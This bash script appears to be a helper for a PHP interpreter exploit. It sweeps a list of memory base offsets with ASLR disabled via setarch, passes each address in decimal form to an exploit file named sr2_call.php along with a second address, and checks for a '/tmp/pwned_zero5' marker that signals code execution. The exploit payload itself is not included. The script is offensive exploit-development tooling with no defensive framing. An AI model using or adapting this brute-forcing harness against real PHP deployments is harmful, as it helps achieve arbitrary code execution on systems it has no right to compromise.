#!/bin/bash
# BASE sweep for sr2_call.php from /tmp/wtest (auto-calibration viability probe)
cd /tmp/wtest || exit 1
PHP=/tmp/php8512_build/plain2/sapi/cli/php
ZIF_DEC=0093824996228192
for off in 7e000 7f000 80000 81000 82000 83000 84000 85000 86000 46000 47000 48000; do
  base=$((0x7ffff5400000 + 0x$off))
  dec=$(printf "%016d" $base)
  rm -f /tmp/pwned_zero5
  timeout 20 setarch x86_64 -R $PHP -n sr2_call.php "$dec" "$ZIF_DEC" >/dev/null 2>&1
  if [ -f /tmp/pwned_zero5 ]; then
    echo "HIT off=0x$off base=$(printf 0x%x $base)"
    cat /tmp/pwned_zero5
    exit 0
  else
    echo "miss off=0x$off"
  fi
done
echo "no hit in sweep"
